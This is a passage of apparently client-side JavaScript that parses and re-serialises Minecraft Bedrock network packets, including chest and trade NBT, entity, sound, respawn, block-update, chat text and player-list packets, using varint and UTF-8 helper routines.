        return match[1] !== undefined ? match[1] : null;
    }

    let val = match[2];

    if (!val) return null;

    if (type === 'num') return parseInt(val.replace(/[bsfl]$/i, ''));
    if (type === 'bool') return parseInt(val.replace(/[bsfl]$/i, '')) === 1;

    return null;
};

const ParseChestNBT = (nbtStr) => {
    if (en_nbts[nbtStr] !== undefined) return en_nbts[nbtStr];
    const cleanStr = nbtStr.trim();
    const result = {
        Findable: false,
        IsIgnoreShuffle: false,
        IsOpened: false,
        Items: [],
        id: "Chest",
        isMovable: false,
        x: 0,
        y: 0,
        z: 0
    };
    const config = {
        Findable: 'bool',
        IsIgnoreShuffle: 'bool',
        IsOpened: 'bool',
        isMovable: 'bool',
        x: 'num',
        y: 'num',
        z: 'num',
        id: 'str'
    };
    for (const key in config) {
        const val = getNbtVal(cleanStr, key, config[key]);
        if (val !== null) result[key] = val;
    }
    const itemsStart = cleanStr.indexOf('Items:[');
    if (itemsStart !== -1) {
        let bCount = 1;
        let i = itemsStart + 7;
        let arrEnd = -1;
        for (; i < cleanStr.length; i++) {
            if (cleanStr[i] === '[') bCount++;
            else if (cleanStr[i] === ']') bCount--;
            if (bCount === 0) {
                arrEnd = i;
                break;
            }
        }
        if (arrEnd !== -1) {
            const content = cleanStr.substring(itemsStart + 7, arrEnd);
            let depth = 0;
            let start = -1;
            for (let j = 0; j < content.length; j++) {
                if (content[j] === '{') {
                    if (depth === 0) start = j;
                    depth++;
                } else if (content[j] === '}') {
                    depth--;
                    if (depth === 0 && start !== -1) {
                        const itemStr = content.substring(start, j + 1);
                        const itemName = getNbtVal(itemStr, 'Name', 'str');
                        const item = {
                            Slot: getNbtVal(itemStr, 'Slot', 'num') || 0,
                            id: itemName || '',
                            Count: getNbtVal(itemStr, 'Count', 'num') || 1
                        };
                        const dmg = getNbtVal(itemStr, 'Damage', 'num');
                        if (dmg !== null) item.Damage = dmg;
                        const tIdx = itemStr.indexOf('tag:{');
                        if (tIdx !== -1) {
                            let tCount = 1;
                            let tEnd = -1;
                            for (let k = tIdx + 5; k < itemStr.length; k++) {
                                if (itemStr[k] === '{') tCount++;
                                else if (itemStr[k] === '}') tCount--;
                                if (tCount === 0) {
                                    tEnd = k + 1;
                                    break;
                                }
                            }
                            if (tEnd !== -1) item.tag = itemStr.substring(tIdx + 4, tEnd);
                        }
                        result.Items.push(item);
                        start = -1;
                    }
                }
            }
        }
    }
    en_nbts[nbtStr] = result;
    return result;
};

function ParseStartGame(buffer) {
    const u8 = new Uint8Array(buffer);
    let offset = 0;

    function readVarLong() {
        let value = 0n;
        let shift = 0n;
        let b;
        do {
            b = u8[offset++];
            value |= BigInt(b & 0x7F) << shift;
            shift += 7n;
        } while (b & 0x80);
        return value.toString();
    }
    readVarLong();
    return readVarLong();
}

function ParseTextPacket_ReadVarInt(u8, offset) {
    let value = 0;
    let shift = 0;
    let byte;
    do {
        if (offset >= u8.length) break;
        byte = u8[offset++];
        value |= (byte & 0x7f) << shift;
        shift += 7;
    } while (byte & 0x80);
    return {
        value: value >>> 0,
        offset: offset
    };
}

function ParseUpdateTradePacket(data, isRestore = false) {
    if (isRestore) {
        let packet = [];

        function writeByte(val) {
            packet.push(val & 0xFF);
        }

        function writeUVarInt(val) {
            let v = val;
            if (v < 0) v = v >>> 0;
            /* 变长整数编码保护：非有限值归零 + 字节掩码 + 最多 10 字节，
               避免写出非法字节或陷入不终止的循环。 */
            if (!isFinite(v)) v = 0;
            for (let _tuG = 0; _tuG < 10; _tuG++) {
                let temp = v % 128;
                v = Math.floor(v / 128);
                if (v > 0) temp |= 0x80;
                packet.push(temp & 0xFF);
                if (v === 0) break;
            }
        }

        function writeSVarInt(val) {
            let uval = val >= 0 ? val * 2 : (Math.abs(val) * 2) - 1;
            writeUVarInt(uval);
        }

        function writeString(str) {
            if (!str) str = "";
            let bytes = [];
            for (let i = 0; i < str.length; i++) {
                let charcode = str.charCodeAt(i);
                if (charcode < 0x80) {
                    bytes.push(charcode);
                } else if (charcode < 0x800) {
                    bytes.push(0xc0 | (charcode >> 6), 0x80 | (charcode & 0x3f));
                } else if (charcode < 0xd800 || charcode >= 0xe000) {
                    bytes.push(0xe0 | (charcode >> 12), 0x80 | ((charcode >> 6) & 0x3f), 0x80 | (charcode & 0x3f));
                } else {
                    i++;
                    charcode = 0x10000 + (((charcode & 0x3ff) << 10) | (str.charCodeAt(i) & 0x3ff));
                    bytes.push(0xf0 | (charcode >> 18), 0x80 | ((charcode >> 12) & 0x3f), 0x80 | ((charcode >> 6) & 0x3f), 0x80 | (charcode & 0x3f));
                }
            }
            writeUVarInt(bytes.length);
            for (let i = 0; i < bytes.length; i++) {
                writeByte(bytes[i]);
            }
        }

        function EncodeNetworkNBT(obj) {
            let nbtPacket = [];
            let viewBuffer = new ArrayBuffer(8);
            let view = new DataView(viewBuffer);
            let u8 = new Uint8Array(viewBuffer);

            function writeNbtByte(v) {
                nbtPacket.push(v & 0xFF);
            }

            function writeNbtShort(v) {
                view.setInt16(0, v, true);
                nbtPacket.push(u8[0], u8[1]);
            }

            function writeNbtUVarInt(val) {
                let v = val;
                if (v < 0) v = v >>> 0;
                do {
                    let temp = v % 128;
                    v = Math.floor(v / 128);
                    if (v > 0) temp |= 0x80;
                    nbtPacket.push(temp);
                } while (v > 0);
            }

            function writeNbtSVarInt(val) {
                let uval = val >= 0 ? val * 2 : (Math.abs(val) * 2) - 1;
                writeNbtUVarInt(uval);
            }

            function writeNbtFloat(v) {
                view.setFloat32(0, v, true);
                nbtPacket.push(u8[0], u8[1], u8[2], u8[3]);
            }

            function writeNbtDouble(v) {
                view.setFloat64(0, v, true);
                for (let i = 0; i < 8; i++) nbtPacket.push(u8[i]);
            }

            function writeNbtString(str) {
                let strBytes = [];
                for (let i = 0; i < str.length; i++) {
                    let c = str.charCodeAt(i);
                    if (c < 0x80) strBytes.push(c);
                    else if (c < 0x800) strBytes.push(0xc0 | (c >> 6), 0x80 | (c & 0x3f));
                    else strBytes.push(0xe0 | (c >> 12), 0x80 | ((c >> 6) & 0x3f), 0x80 | (c & 0x3f));
                }
                writeNbtUVarInt(strBytes.length);
                for (let i = 0; i < strBytes.length; i++) nbtPacket.push(strBytes[i]);
            }

            function getTagType(key, val, parentObj) {
                if (parentObj && parentObj.__nbtTypes && parentObj.__nbtTypes[key] !== undefined) {
                    return parentObj.__nbtTypes[key];
                }
                if (typeof val === 'string') return 8;
                if (typeof val === 'boolean') return 1;
                if (typeof val === 'number') {
                    if (['priceMultiplierA', 'priceMultiplierB'].includes(key) || (!Number.isInteger(val) && val % 1 !== 0)) return 5;
                    if (['Count', 'WasPickedUp', 'rewardExp', 'Unbreakable', 'keep_on_death', 'minecraft:keep_on_death', 'modEnchant', 'map_display_players', 'map_regenerate'].includes(key)) return 1;
                    if (['Damage', 'val', 'id', 'lvl'].includes(key)) return 2;
                    if (['map_uuid', 'villagerUniqueId', 'entityUniqueId'].includes(key) || val > 2147483647 || val < -2147483648) return 4;
                    return 3;
                }
                if (Array.isArray(val)) return 9;
                if (typeof val === 'object' && val !== null) return 10;
                return 0;
            }

            function writeTagValue(type, key, val, parentObj) {
                switch (type) {
                    case 1:
                        writeNbtByte(typeof val === 'boolean' ? (val ? 1 : 0) : val);
                        break;
                    case 2:
                        writeNbtShort(val);
                        break;
                    case 3:
                        writeNbtSVarInt(val);
                        break;
                    case 4:
                        writeNbtSVarInt(val);
                        break;
                    case 5:
                        writeNbtFloat(val);
                        break;
                    case 6:
                        writeNbtDouble(val);
                        break;
                    case 7:
                        writeNbtSVarInt(val.length);
                        for (let i = 0; i < val.length; i++) writeNbtByte(val[i]);
                        break;
                    case 8:
                        writeNbtString(val);
                        break;
                    case 9:
                        if (val.length === 0) {
                            writeNbtByte(0);
                            writeNbtSVarInt(0);
                        } else {
                            let ltype = val.__listType !== undefined ? val.__listType : getTagType(null, val[0], null);
                            writeNbtByte(ltype);
                            writeNbtSVarInt(val.length);
                            for (let i = 0; i < val.length; i++) writeTagValue(ltype, null, val[i], null);
                        }
                        break;
                    case 10:
                        for (let k in val) {
                            if (k === '__nbtTypes') continue;
                            let t = getTagType(k, val[k], val);
                            if (t === 0) continue;
                            writeNbtByte(t);
                            writeNbtString(k);
                            writeTagValue(t, k, val[k], val);
                        }
                        writeNbtByte(0);
                        break;
                    case 11:
                        writeNbtSVarInt(val.length);
                        for (let i = 0; i < val.length; i++) writeNbtSVarInt(val[i]);
                        break;
                }
            }

            writeNbtByte(10);
            writeNbtString("");
            writeTagValue(10, "", obj, obj);

            return nbtPacket;
        }

        writeByte(data.windowId !== undefined ? data.windowId : 0);
        writeByte(data.windowType !== undefined ? data.windowType : 0);
        writeSVarInt(data.size !== undefined ? data.size : 0);
        writeSVarInt(data.tradeTier !== undefined ? data.tradeTier : 0);
        writeSVarInt(data.villagerUniqueId !== undefined ? data.villagerUniqueId : 0);
        writeSVarInt(data.entityUniqueId !== undefined ? data.entityUniqueId : 0);
        writeString(data.displayName || "");
        writeByte(data.newTradeUi ? 1 : 0);
        writeByte(data.demandBasedPrices ? 1 : 0);

        if (data.offers) {
            let nbtBytes = EncodeNetworkNBT(data.offers);
            for (let i = 0; i < nbtBytes.length; i++) {
                writeByte(nbtBytes[i]);
            }
        }

        return new Uint8Array(packet).buffer;

    } else {
        let u8;
        try {
            u8 = new Uint8Array(data);
        } catch (e) {
            u8 = new Uint8Array(data.length);
            for (let idx = 0; idx < data.length; idx++) {
                u8[idx] = data[idx] & 0xFF;
            }
        }
        let offset = 0;
        let dv = new DataView(u8.buffer, u8.byteOffset, u8.byteLength);

        function readByte() {
            if (offset >= u8.length) return 0;
            return u8[offset++];
        }

        function readUVarInt() {
            let value = 0;
            let shift = 0;
            let byte;
            do {
                if (offset >= u8.length) break;
                byte = u8[offset++];
                value += (byte & 0x7F) * Math.pow(2, shift);
                shift += 7;
            } while (byte & 0x80);
            return value;
        }

        function readSVarInt() {
            let value = readUVarInt();
            let temp = Math.floor(value / 2);
            if (value % 2 !== 0) {
                temp = -temp - 1;
            }
            return temp;
        }

        function readString() {
            let len = readUVarInt();
            let str = "";
            let i = 0;
            while (i < len) {
                if (offset >= u8.length) break;
                let c = readByte();
                i++;
                if (c < 0x80) {
                    str += String.fromCharCode(c);
                } else if (c > 0xbf && c < 0xe0) {
                    let c2 = readByte();
                    i++;
                    str += String.fromCharCode(((c & 0x1f) << 6) | (c2 & 0x3f));
                } else if (c > 0xdf && c < 0xf0) {
                    let c2 = readByte();
                    i++;
                    let c3 = readByte();
                    i++;
                    str += String.fromCharCode(((c & 0x0f) << 12) | ((c2 & 0x3f) << 6) | (c3 & 0x3f));
                } else {
                    let c2 = readByte();
                    i++;
                    let c3 = readByte();
                    i++;
                    let c4 = readByte();
                    i++;
                    let codePoint = (((c & 0x07) << 18) | ((c2 & 0x3f) << 12) | ((c3 & 0x3f) << 6) | (c4 & 0x3f)) - 0x10000;
                    str += String.fromCharCode((codePoint >> 10) | 0xd800, (codePoint & 0x3ff) | 0xdc00);
                }
            }
            return str;
        }

        function ExtractNetworkNBT() {
            function readNbtString() {
                let len = readUVarInt();
                let str = "";
                let i = 0;
                while (i < len) {
                    if (offset >= u8.length) break;
                    let c = readByte();
                    i++;
                    if (c < 0x80) {
                        str += String.fromCharCode(c);
                    } else if (c > 0xbf && c < 0xe0) {
                        let c2 = readByte();
                        i++;
                        str += String.fromCharCode(((c & 0x1f) << 6) | (c2 & 0x3f));
                    } else if (c > 0xdf && c < 0xf0) {
                        let c2 = readByte();
                        i++;
                        let c3 = readByte();
                        i++;
                        str += String.fromCharCode(((c & 0x0f) << 12) | ((c2 & 0x3f) << 6) | (c3 & 0x3f));
                    } else {
                        let c2 = readByte();
                        i++;
                        let c3 = readByte();
                        i++;
                        let c4 = readByte();
                        i++;
                        let codePoint = (((c & 0x07) << 18) | ((c2 & 0x3f) << 12) | ((c3 & 0x3f) << 6) | (c4 & 0x3f)) - 0x10000;
                        str += String.fromCharCode((codePoint >> 10) | 0xd800, (codePoint & 0x3ff) | 0xdc00);
                    }
                }
                return str;
            }

            function readTag(type, container, key) {
                let val;
                try {
                    switch (type) {
                        case 1:
                            val = readByte();
                            break;
                        case 2:
                            val = dv.getInt16(offset, true);
                            offset += 2;
                            break;
                        case 3:
                            val = readSVarInt();
                            break;
                        case 4:
                            val = readSVarInt();
                            break;
                        case 5:
                            val = dv.getFloat32(offset, true);
                            offset += 4;
                            break;
                        case 6:
                            val = dv.getFloat64(offset, true);
                            offset += 8;
                            break;
                        case 7:
                            let blen = readSVarInt();
                            val = [];
                            for (let i = 0; i < blen; i++) val.push(readByte());
                            break;
                        case 8:
                            val = readNbtString();
                            break;
                        case 9:
                            let listType = readByte();
                            let llen = readSVarInt();
                            val = [];
                            Object.defineProperty(val, '__listType', {
                                value: listType,
                                enumerable: false,
                                writable: true
                            });
                            for (let i = 0; i < llen; i++) {
                                val.push(readTag(listType, null, null));
                            }
                            break;
                        case 10:
                            val = {};
                            Object.defineProperty(val, '__nbtTypes', {
                                value: {},
                                enumerable: false,
                                writable: true
                            });
                            while (offset < u8.length) {
                                let t = readByte();
                                if (t === 0) break;
                                let name = readNbtString();
                                let parsedVal = readTag(t, val, name);
                                val[name] = parsedVal;
                                val.__nbtTypes[name] = t;
                            }
                            break;
                        case 11:
                            let ilen = readSVarInt();
                            val = [];
                            for (let i = 0; i < ilen; i++) val.push(readSVarInt());
                            break;
                        default:
                            return null;
                    }
                } catch (e) {
                    return null;
                }
                return val;
            }

            try {
                let rootType = readByte();
                if (rootType === 10) {
                    readNbtString();
                    return readTag(10, null, null);
                }
            } catch (e) {}
            return null;
        }

        let result = {};

        result.windowId = readByte();
        result.windowType = readByte();
        result.size = readSVarInt();
        result.tradeTier = readSVarInt();
        result.villagerUniqueId = readSVarInt();
        result.entityUniqueId = readSVarInt();
        result.displayName = readString();
        result.newTradeUi = readByte() === 1;
        result.demandBasedPrices = readByte() === 1;

        if (offset < u8.length) {
            result.offers = ExtractNetworkNBT();
        }

        return result;
    }
}

function ParseTextPacket_ReadString(u8, offset) {
    let varIntRes = ParseTextPacket_ReadVarInt(u8, offset);
    let length = varIntRes.value;
    offset = varIntRes.offset;
    let str = '';
    let end = offset + length;
    if (end > u8.length) end = u8.length;
    let currentOffset = offset;
    while (currentOffset < end) {
        let c = u8[currentOffset++];
        if (c < 0x80) {
            str += String.fromCharCode(c);
        } else if (c >= 0xC0 && c < 0xE0) {
            if (currentOffset >= end) break;
            let c2 = u8[currentOffset++];
            str += String.fromCharCode(((c & 0x1F) << 6) | (c2 & 0x3F));
        } else if (c >= 0xE0 && c < 0xF0) {
            if (currentOffset + 1 >= end) break;
            let c2 = u8[currentOffset++];
            let c3 = u8[currentOffset++];
            str += String.fromCharCode(((c & 0x0F) << 12) | ((c2 & 0x3F) << 6) | (c3 & 0x3F));
        } else if (c >= 0xF0 && c < 0xF8) {
            if (currentOffset + 2 >= end) break;
            let c2 = u8[currentOffset++];
            let c3 = u8[currentOffset++];
            let c4 = u8[currentOffset++];
            let u = (((c & 0x07) << 18) | ((c2 & 0x3F) << 12) | ((c3 & 0x3F) << 6) | (c4 & 0x3F)) - 0x10000;
            str += String.fromCharCode(0xD800 | (u >> 10), 0xDC00 | (u & 0x3FF));
        }
    }
    return {
        text: str,
        offset: end
    };
}

function BuildAddActorPacket(data) {
    let packet = [];

    function writeByte(val) {
        packet.push(val & 0xFF);
    }

    function writeFloat(val) {
        let buf = new ArrayBuffer(4);
        new DataView(buf).setFloat32(0, val, true);
        let u8 = new Uint8Array(buf);
        for (let i = 0; i < 4; i++) packet.push(u8[i]);
    }

    function writeUVarInt(val) {
        let v = val;
        if (v < 0) v = v >>> 0;
        /* 变长整数编码保护：非有限值归零 + 字节掩码 + 最多 10 字节，
           避免写出非法字节或陷入不终止的循环。 */
        if (!isFinite(v)) v = 0;
        for (let _tuG = 0; _tuG < 10; _tuG++) {
            let temp = v % 128;
            v = Math.floor(v / 128);
            if (v > 0) temp |= 0x80;
            packet.push(temp & 0xFF);
            if (v === 0) break;
        }
    }

    function writeSVarInt(val) {
        let uval = val >= 0 ? val * 2 : (Math.abs(val) * 2) - 1;
        writeUVarInt(uval);
    }

    function writeString(str) {
        if (!str) str = "";
        let bytes = [];
        for (let i = 0; i < str.length; i++) {
            let charcode = str.charCodeAt(i);
            if (charcode < 0x80) {
                bytes.push(charcode);
            } else if (charcode < 0x800) {
                bytes.push(0xc0 | (charcode >> 6), 0x80 | (charcode & 0x3f));
            } else if (charcode < 0xd800 || charcode >= 0xe000) {
                bytes.push(0xe0 | (charcode >> 12), 0x80 | ((charcode >> 6) & 0x3f), 0x80 | (charcode & 0x3f));
            } else {
                i++;
                charcode = 0x10000 + (((charcode & 0x3ff) << 10) | (str.charCodeAt(i) & 0x3ff));
                bytes.push(0xf0 | (charcode >> 18), 0x80 | ((charcode >> 12) & 0x3f), 0x80 | ((charcode >> 6) & 0x3f), 0x80 | (charcode & 0x3f));
            }
        }
        writeUVarInt(bytes.length);
        for (let i = 0; i < bytes.length; i++) {
            writeByte(bytes[i]);
        }
    }

    function writeVec3(vec) {
        writeFloat(vec.x || 0);
        writeFloat(vec.y || 0);
        writeFloat(vec.z || 0);
    }

    writeSVarInt(data.entityUniqueId || 0);
    writeUVarInt(data.entityRuntimeId || 0);
    writeString(data.identifier || "");
    writeVec3(data.position || {
        x: 0,
        y: 0,
        z: 0
    });
    writeVec3(data.velocity || {
        x: 0,
        y: 0,
        z: 0
    });
    writeFloat(data.pitch || 0);
    writeFloat(data.yaw || 0);
    writeFloat(data.headYaw || 0);
    writeFloat(data.bodyYaw || 0);

    let attributes = data.attributes || [];
    writeUVarInt(attributes.length);
    for (let i = 0; i < attributes.length; i++) {
        writeString(attributes[i].name || "");
        writeFloat(attributes[i].min || 0);
        writeFloat(attributes[i].max || 0);
        writeFloat(attributes[i].val || 0);
        writeFloat(attributes[i].defaultVal || 0);
    }

    writeUVarInt(0);
    writeUVarInt(0);
    writeUVarInt(0);
    writeUVarInt(0);

    if (data.tailBytes) {
        for (let i = 0; i < data.tailBytes.length; i++) {
            writeByte(data.tailBytes[i]);
        }
    }

    return new Uint8Array(packet).buffer;
}

function BuildLevelSoundEventPacket(data) {
    let packet = [];

    function writeByte(val) {
        packet.push(val & 0xFF);
    }

    function writeFloat(val) {
        let buf = new ArrayBuffer(4);
        new DataView(buf).setFloat32(0, val, true);
        let u8 = new Uint8Array(buf);
        for (let i = 0; i < 4; i++) packet.push(u8[i]);
    }

    function writeUVarInt(val) {
        let v = val;
        if (v < 0) v = v >>> 0;
        /* 变长整数编码保护：非有限值归零 + 字节掩码 + 最多 10 字节，
           避免写出非法字节或陷入不终止的循环。 */
        if (!isFinite(v)) v = 0;
        for (let _tuG = 0; _tuG < 10; _tuG++) {
            let temp = v % 128;
            v = Math.floor(v / 128);
            if (v > 0) temp |= 0x80;
            packet.push(temp & 0xFF);
            if (v === 0) break;
        }
    }

    function writeSVarInt(val) {
        let uval = val >= 0 ? val * 2 : (Math.abs(val) * 2) - 1;
        writeUVarInt(uval);
    }

    function writeString(str) {
        if (!str) str = "";
        let bytes = [];
        for (let i = 0; i < str.length; i++) {
            let charcode = str.charCodeAt(i);
            if (charcode < 0x80) {
                bytes.push(charcode);
            } else if (charcode < 0x800) {
                bytes.push(0xc0 | (charcode >> 6), 0x80 | (charcode & 0x3f));
            } else if (charcode < 0xd800 || charcode >= 0xe000) {
                bytes.push(0xe0 | (charcode >> 12), 0x80 | ((charcode >> 6) & 0x3f), 0x80 | (charcode & 0x3f));
            } else {
                i++;
                charcode = 0x10000 + (((charcode & 0x3ff) << 10) | (str.charCodeAt(i) & 0x3ff));
                bytes.push(0xf0 | (charcode >> 18), 0x80 | ((charcode >> 12) & 0x3f), 0x80 | ((charcode >> 6) & 0x3f), 0x80 | (charcode & 0x3f));
            }
        }
        writeUVarInt(bytes.length);
        for (let i = 0; i < bytes.length; i++) {
            writeByte(bytes[i]);
        }
    }

    function writeVec3(vec) {
        writeFloat(vec.x || 0);
        writeFloat(vec.y || 0);
        writeFloat(vec.z || 0);
    }

    writeUVarInt(data.soundId || 0);
    writeVec3(data.position || {
        x: 0,
        y: 0,
        z: 0
    });
    writeSVarInt(data.extraData || 0);
    writeString(data.entityType || ":");
    writeByte(data.isBaby ? 1 : 0);
    writeByte(data.isGlobal ? 1 : 0);

    if (data.tailBytes) {
        for (let i = 0; i < data.tailBytes.length; i++) {
            writeByte(data.tailBytes[i]);
        }
    }

    return new Uint8Array(packet).buffer;
}

function ParseRespawnPacket(data, isRestore = false) {
    if (isRestore) {
        let packet = [];

        const writeByte = (val) => {
            packet.push(Number(val) & 0xFF);
        };

        const writeFloat32 = (val) => {
            let buffer = new ArrayBuffer(4);
            new DataView(buffer).setFloat32(0, Number(val), true);
            let view = new Uint8Array(buffer);
            for (let i = 0; i < 4; i++) packet.push(view[i]);
        };

        const writeVec3 = (vec) => {
            writeFloat32(vec.x !== undefined ? vec.x : 0);
            writeFloat32(vec.y !== undefined ? vec.y : 0);
            writeFloat32(vec.z !== undefined ? vec.z : 0);
        };

        const writeUVarInt64 = (val) => {
            try {
                let v = BigInt(val);
                if (v < BigInt(0)) {
                    v = BigInt("18446744073709551616") + v;
                }
                do {
                    let temp = Number(v & BigInt(0x7F));
                    v = v >> BigInt(7);
                    if (v > BigInt(0)) temp |= 0x80;
                    packet.push(temp);
                } while (v > BigInt(0));
            } catch (e) {
                let v = Number(val);
                if (v < 0) v = v >>> 0;
                /* 变长整数编码保护：非有限值归零 + 字节掩码 + 最多 10 字节，
                   避免写出非法字节或陷入不终止的循环。 */
                if (!isFinite(v)) v = 0;
                for (let _tuG = 0; _tuG < 10; _tuG++) {
                    let temp = v % 128;
                    v = Math.floor(v / 128);
                    if (v > 0) temp |= 0x80;
                    packet.push(temp & 0xFF);
                    if (v === 0) break;
                }
            }
        };

        writeVec3(data.position || {});
        writeByte(data.state !== undefined ? data.state : 0);
        writeUVarInt64(data.entityRuntimeId !== undefined ? data.entityRuntimeId : 0);

        return new Uint8Array(packet).buffer;

    } else {
        let u8;
        try {
            u8 = new Uint8Array(data);
        } catch (e) {
            u8 = new Uint8Array(data.length);
            for (let idx = 0; idx < data.length; idx++) {
                u8[idx] = data[idx] & 0xFF;
            }
        }
        let offset = 0;
        let dv = new DataView(u8.buffer, u8.byteOffset, u8.byteLength);

        const readByte = () => {
            if (offset >= u8.length) return 0;
            return u8[offset++];
        };

        const readFloat32 = () => {
            if (offset + 4 > u8.length) {
                offset = u8.length;
                return 0;
            }
            let val = dv.getFloat32(offset, true);
            offset += 4;
            return val;
        };

        const readVec3 = () => {
            return {
                x: readFloat32(),
                y: readFloat32(),
                z: readFloat32()
            };
        };

        const readUVarInt64 = () => {
            try {
                let value = BigInt(0);
                let shift = BigInt(0);
                let byteData;
                do {
                    if (offset >= u8.length) break;
                    byteData = BigInt(u8[offset++]);
                    value += (byteData & BigInt(0x7F)) << shift;
                    shift += BigInt(7);
                } while (byteData & BigInt(0x80));
                return value.toString();
            } catch (e) {
                let value = 0;
                let shift = 0;
                let byteData;
                do {
                    if (offset >= u8.length) break;
                    byteData = u8[offset++];
                    value += (byteData & 0x7F) * Math.pow(2, shift);
                    shift += 7;
                } while (byteData & 0x80);
                return value;
            }
        };

        let result = {};

        result.position = readVec3();
        result.state = readByte();
        result.entityRuntimeId = readUVarInt64();

        return result;
    }
}

function ParseUpdateBlockPacket(data, isRestore = false) {
    if (isRestore) {
        let packet = [];

        function writeByte(val) {
            packet.push(val & 0xFF);
        }

        function writeUVarInt(val) {
            let v = typeof val === 'bigint' ? val : BigInt(val);
            if (v < 0n) v = BigInt.asUintN(64, v);
            do {
                let temp = Number(v & 0x7Fn);
                v = v >> 7n;
                if (v > 0n) temp |= 0x80;
                packet.push(temp);
            } while (v > 0n);
        }

        function writeSVarInt(val) {
            let n = typeof val === 'bigint' ? val : BigInt(val);
            let uval = n >= 0n ? n * 2n : (-n * 2n) - 1n;
            writeUVarInt(uval);
        }

        if (data.pos) {
            writeSVarInt(data.pos.x !== undefined ? data.pos.x : 0);
            let y = data.pos.y !== undefined ? data.pos.y : 0;
            if (y < 0) {
                y = y >>> 0;
            }
            writeUVarInt(y);
            writeSVarInt(data.pos.z !== undefined ? data.pos.z : 0);
        } else {
            writeSVarInt(0);
            writeUVarInt(0);
            writeSVarInt(0);
        }

        writeUVarInt(data.blockRuntimeId !== undefined ? data.blockRuntimeId : 0);
        writeUVarInt(data.flags !== undefined ? data.flags : 0);
        writeUVarInt(data.layer !== undefined ? data.layer : 0);

        return new Uint8Array(packet).buffer;

    } else {
        let u8;
        try {
            u8 = new Uint8Array(data);
        } catch (e) {
            u8 = new Uint8Array(data.length);
            for (let idx = 0; idx < data.length; idx++) {
                u8[idx] = data[idx] & 0xFF;
            }
        }
        let offset = 0;

        function readByte() {
            if (offset >= u8.length) return 0;
            return u8[offset++];
        }

        function readUVarInt() {
            let value = 0n;
            let shift = 0n;
            let byteData;
            do {
                if (offset >= u8.length) break;
                byteData = u8[offset++];
                value |= BigInt(byteData & 0x7F) << shift;
                shift += 7n;
            } while (byteData & 0x80);
            return value;
        }

        function readSVarInt() {
            let value = readUVarInt();
            let temp = value / 2n;
            if (value % 2n !== 0n) {
                temp = -temp - 1n;
            }
            return Number(temp);
        }

        let result = {};

        let posX = readSVarInt();
        let posY = Number(readUVarInt() & 0xFFFFFFFFn);
        if (posY >= 0x80000000) {
            posY -= 0x100000000;
        }
        let posZ = readSVarInt();

        result.pos = {
            x: posX,
            y: posY,
            z: posZ
        };

        result.blockRuntimeId = Number(readUVarInt());
        result.flags = Number(readUVarInt());
        result.layer = Number(readUVarInt());

        return result;
    }
}

function ParseTextPacket(buffer) {
    let u8 = new Uint8Array(buffer);
    let offset = 0;
    let type = u8[offset++];
    let needsTranslation = u8[offset++] !== 0;
    let sourceName = "";
    let message = "";
    let parameters = [];
    let strRes;
    if (type === 1 || type === 7 || type === 8) {
        strRes = ParseTextPacket_ReadString(u8, offset);
        sourceName = strRes.text;
        offset = strRes.offset;
        strRes = ParseTextPacket_ReadString(u8, offset);
        message = strRes.text;
        offset = strRes.offset;
    } else if (type === 2 || type === 3 || type === 4) {
        strRes = ParseTextPacket_ReadString(u8, offset);
        message = strRes.text;
        offset = strRes.offset;
        let varIntRes = ParseTextPacket_ReadVarInt(u8, offset);
        let count = varIntRes.value;
        offset = varIntRes.offset;
        for (let i = 0; i < count; i++) {
            strRes = ParseTextPacket_ReadString(u8, offset);
            parameters.push(strRes.text);
            offset = strRes.offset;
        }
    } else {
        strRes = ParseTextPacket_ReadString(u8, offset);
        message = strRes.text;
        offset = strRes.offset;
    }
    let xuid = "";
    let platformChatId = "";
    if (offset < u8.length) {
        strRes = ParseTextPacket_ReadString(u8, offset);
        xuid = strRes.text;
        offset = strRes.offset;
    }
    if (offset < u8.length) {
        strRes = ParseTextPacket_ReadString(u8, offset);
        platformChatId = strRes.text;
        offset = strRes.offset;
    }
    let PlayerId = null;
    for (let i = 0; i < u8.length - 8; i++) {
        if (u8[i] === 80 && u8[i + 1] === 108 && u8[i + 2] === 97 && u8[i + 3] === 121 && u8[i + 4] === 101 && u8[i + 5] === 114 && u8[i + 6] === 73 && u8[i + 7] === 100) {
            let tempOffset = i + 8;
            let idRes = ParseTextPacket_ReadString(u8, tempOffset);
            PlayerId = idRes.text;
            break;
        }
    }
    return {
        type: type,
        NeedsTranslation: needsTranslation,
        SourceName: sourceName,
        message: message,
        Parameters: parameters,
        xuid: xuid,
        PlatformChatId: platformChatId,
        PlayerId: PlayerId
    };
}

function RemoveActor_readZigZagVarLong(cursor) {
    let value = 0n;
    let shift = 0n;
    let b;
    do {
        b = cursor.u8[cursor.offset++];
        value |= BigInt(b & 0x7F) << shift;
        shift += 7n;
    } while (b & 0x80);

    return ((value >> 1n) ^ -(value & 1n)).toString();
}

function ParseRemoveActor(buffer) {
    const cursor = {
        u8: buffer instanceof Uint8Array ? buffer : new Uint8Array(buffer),
        offset: 0
    };
    try {
        const entityUniqueId = RemoveActor_readZigZagVarLong(cursor);
        return {
            uniqueId: entityUniqueId
        };
    } catch (e) {
        return null;
    }
}

function ParsePlayerListPacket(data, isRestore = false) {
    const _b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
    const _b64lookup = new Uint8Array(256);
    for (let i = 0; i < _b64chars.length; i++) {
        _b64lookup[_b64chars.charCodeAt(i)] = i;
    }

    function bytesToBase64(bytes) {
        if (!bytes || bytes.length === 0) return "";
        let i;
        let base64 = '';
        let len = bytes.length;
        for (i = 0; i < len; i += 3) {
            base64 += _b64chars[bytes[i] >> 2];
            base64 += _b64chars[((bytes[i] & 3) << 4) | (bytes[i + 1] >> 4)];
            base64 += _b64chars[((bytes[i + 1] & 15) << 2) | (bytes[i + 2] >> 6)];
            base64 += _b64chars[bytes[i + 2] & 63];
        }
        if (len % 3 === 2) {
            base64 = base64.substring(0, base64.length - 1) + '=';
        } else if (len % 3 === 1) {
            base64 = base64.substring(0, base64.length - 2) + '==';
        }
        return base64;
    }

    function base64ToBytes(base64) {
        if (!base64) return new Uint8Array(0);
        let bufferLength = base64.length * 0.75;
        let len = base64.length,
            i, p = 0;
        let encoded1, encoded2, encoded3, encoded4;
        if (base64[base64.length - 1] === '=') {
            bufferLength--;
            if (base64[base64.length - 2] === '=') {
                bufferLength--;
            }
        }
        let bytes = new Uint8Array(bufferLength);
        for (i = 0; i < len; i += 4) {
            encoded1 = _b64lookup[base64.charCodeAt(i)];
            encoded2 = _b64lookup[base64.charCodeAt(i + 1)];
            encoded3 = _b64lookup[base64.charCodeAt(i + 2)];
